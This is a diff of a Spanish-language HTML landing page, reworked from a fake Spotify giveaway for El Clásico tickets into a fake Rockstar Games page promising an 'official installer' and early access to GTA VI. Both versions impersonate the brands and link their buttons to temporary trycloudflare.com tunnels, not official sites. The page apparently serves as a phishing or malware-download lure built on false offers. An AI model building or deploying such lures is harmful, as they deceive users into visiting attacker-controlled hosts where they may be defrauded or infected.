@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Spotify Promo - El Clásico</title>
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;800&display=swap" rel="stylesheet">
+    <title>GTA VI - Download Now</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&family=Bebas+Neue&display=swap" rel="stylesheet">
     <style>
-        /* RESET DE ESTILOS */
+        /* RESET */
         * {
             margin: 0;
             padding: 0;
@@ -14,143 +14,144 @@
         }
 
         body {
-            background-color: #000000;
-            font-family: 'Montserrat', sans-serif;
+            background-color: #050505;
+            font-family: 'Inter', sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            color: #FFFFFF;
+            color: white;
             overflow: hidden;
         }
 
-        /* CONTENEDOR PRINCIPAL (LA TARJETA) */
-        .promo-card {
-            background: linear-gradient(180deg, #222222 0%, #121212 100%);
-            width: 90%;
-            max-width: 450px;
-            padding: 40px;
-            border-radius: 12px;
-            text-align: center;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
+        /* FONDO DINÁMICO (VIBE VICE CITY) */
+        .bg-video-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, rgba(255, 0, 212, 0.1) 0%, rgba(0, 204, 255, 0.1) 100%);
+            z-index: -1;
+        }
+
+        /* TARJETA DE DESCARGA */
+        .download-card {
+            background: rgba(20, 20, 20, 0.8);
+            backdrop-filter: blur(15px);
             border: 1px solid rgba(255, 255, 255, 0.1);
-            transition: transform 0.3s ease;
+            width: 95%;
+            max-width: 500px;
+            padding: 50px 30px;
+            border-radius: 20px;
+            text-align: center;
+            box-shadow: 0 0 50px rgba(0, 0, 0, 0.8), 0 0 20px rgba(255, 215, 0, 0.1);
         }
 
-        .promo-card:hover {
-            transform: translateY(-5px);
-        }
-
-        /* LOGO DE SPOTIFY */
-        .spotify-header {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            margin-bottom: 30px;
-        }
-
-        .spotify-logo {
-            width: 45px;
-            height: 45px;
-        }
-
-        .spotify-header span {
-            font-size: 26px;
-            font-weight: 800;
-            letter-spacing: -1px;
-        }
-
-        /* CONTENIDO DE TEXTO */
-        .badge {
-            display: inline-block;
-            background-color: #1DB954;
-            color: #000;
-            font-size: 10px;
-            font-weight: 800;
-            padding: 4px 12px;
-            border-radius: 4px;
-            text-transform: uppercase;
+        /* LOGO ROCKSTAR */
+        .rockstar-logo {
+            width: 60px;
             margin-bottom: 20px;
-            letter-spacing: 1px;
+            filter: drop-shadow(0 0 10px rgba(255, 215, 0, 0.5));
+        }
+
+        /* TEXTOS */
+        .brand-name {
+            font-family: 'Bebas Neue', sans-serif;
+            font-size: 18px;
+            letter-spacing: 5px;
+            color: #FFD700; /* Dorado Rockstar */
+            margin-bottom: 10px;
         }
 
         h1 {
-            font-size: 32px;
-            font-weight: 800;
-            line-height: 1.1;
-            margin-bottom: 20px;
+            font-family: 'Bebas Neue', sans-serif;
+            font-size: 64px;
+            line-height: 0.9;
+            margin-bottom: 15px;
+            background: linear-gradient(to bottom, #fff 40%, #ccc 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
 
-        h1 span {
-            color: #1DB954;
+        .version-tag {
+            background: linear-gradient(90deg, #ff00d4, #00ccff);
+            padding: 5px 15px;
+            font-size: 12px;
+            font-weight: 900;
+            border-radius: 5px;
+            display: inline-block;
+            margin-bottom: 25px;
+            text-transform: uppercase;
         }
 
         p {
-            color: #b3b3b3;
-            font-size: 15px;
-            line-height: 1.5;
+            color: #aaa;
+            font-size: 14px;
             margin-bottom: 40px;
+            line-height: 1.6;
         }
 
-        /* BOTÓN DE ENLACE ESTILO SPOTIFY */
-        .btn-action {
-            display: inline-block; /* Importante para que acepte paddings */
-            background-color: #1DB954;
-            color: #000000;
-            text-decoration: none; /* Quita el subrayado del enlace */
-            padding: 18px 45px;
-            font-size: 16px;
-            font-weight: 700;
-            border-radius: 500px;
+        /* BOTÓN DE DESCARGA */
+        .btn-download {
+            display: block;
+            background: #FFD700;
+            color: #000;
+            text-decoration: none;
+            padding: 20px;
+            font-weight: 900;
+            font-size: 18px;
+            border-radius: 10px;
             text-transform: uppercase;
-            letter-spacing: 1.5px;
-            transition: all 0.2s ease-in-out;
-            border: none;
-            cursor: pointer;
+            letter-spacing: 2px;
+            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            box-shadow: 0 10px 20px rgba(255, 215, 0, 0.2);
         }
 
-        .btn-action:hover {
-            background-color: #1ed760;
-            transform: scale(1.06);
-            color: #000000;
+        .btn-download:hover {
+            transform: scale(1.05);
+            background: #fff;
+            box-shadow: 0 15px 30px rgba(255, 255, 255, 0.3);
         }
 
-        .btn-action:active {
-            transform: scale(0.98);
-            background-color: #1aa34a;
+        .btn-download:active {
+            transform: scale(0.95);
         }
 
-        /* DETALLES DE FONDO */
-        .bg-glow {
-            position: absolute;
-            width: 300px;
-            height: 300px;
-            background: radial-gradient(circle, rgba(29, 185, 84, 0.15) 0%, rgba(0, 0, 0, 0) 70%);
-            z-index: -1;
+        /* DECORACIÓN */
+        .footer-info {
+            margin-top: 30px;
+            font-size: 10px;
+            color: #555;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
     </style>
 </head>
 <body>
 
-    <div class="bg-glow"></div>
+    <div class="bg-video-overlay"></div>
 
-    <div class="promo-card">
-        <div class="spotify-header">
-            <svg class="spotify-logo" viewBox="0 0 167.5 167.5">
-                <path fill="#1DB954" d="M83.7 0C37.5 0 0 37.5 0 83.7c0 46.3 37.5 83.7 83.7 83.7 46.3 0 83.7-37.5 83.7-83.7S130 0 83.7 0zM122.1 120.8c-1.4 2.3-4.3 3-6.6 1.6-18.5-11.3-41.8-13.9-69.2-7.6-2.7.7-5.3-1.1-5.9-3.7-.7-2.6 1.1-5.3 3.7-5.9 30-6.8 55.8-3.9 76.4 8.7 2.3 1.4 3 4.3 1.6 6.9zm10.4-22.8c-1.7 2.8-5.3 3.7-8.1 2-21.1-13-53.3-16.8-78.3-9.2-3.1 1-6.5-.8-7.5-3.9-1-3.1.8-6.5 3.9-7.5 28.5-8.6 64.1-4.4 88 10.3 2.8 1.8 3.7 5.4 2 8.3zm1.1-23.9C108.7 57.7 67.3 56.3 43.4 63.6c-3.9 1.2-8-1-9.2-4.9-1.2-3.9 1-8 4.9-9.2 27.5-8.3 73.3-6.7 101.4 10 3.5 2.1 4.7 6.7 2.6 10.2-2 3.5-6.7 4.7-10.2 2.6z"/>
-            </svg>
-            <span>Spotify</span>
+    <div class="download-card">
+        <!-- Logo Rockstar Simulado -->
+        <svg class="rockstar-logo" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect width="100" height="100" rx="15" fill="#FFD700"/>
+            <path d="M50 20L58 45H85L63 60L72 85L50 70L28 85L37 60L15 45H42L50 20Z" fill="black"/>
+        </svg>
+
+        <div class="brand-name">Rockstar Games Presents</div>
+        <h1>GRAND THEFT AUTO VI</h1>
+        
+        <div class="version-tag">Acceso Anticipado</div>
+
+        <p>Vive la experiencia definitiva en Leonida. Descarga el instalador oficial y prepárate para el lanzamiento más esperado de la década.</p>
+
+        <!-- Cambia "descarga.html" por tu archivo de destino -->
+        <a href="https://proud-consequences-colin-johnston.trycloudflare.com" class="btn-download">Descargar Ahora</a>
+
+        <div class="footer-info">
+            ©2026 Rockstar Games, Inc. | PC & Next-Gen Support
         </div>
-
-        <div class="badge">Especial Fans</div>
-        
-        <h1>¡Gana gratis una entrada para el <span>Barça vs Real Madrid</span>!</h1>
-        
-        <p>Tu música te lleva al estadio. Participa hoy mismo por un pase VIP para vivir El Clásico en vivo.</p>
-        
-        <!-- Cambia "tu-archivo.html" por la ruta de tu destino -->
-        <a href="https://acquire-beautifully-iowa-drinking.trycloudflare.com" class="btn-action">Oprime aquí</a>
     </div>
 
 </body>
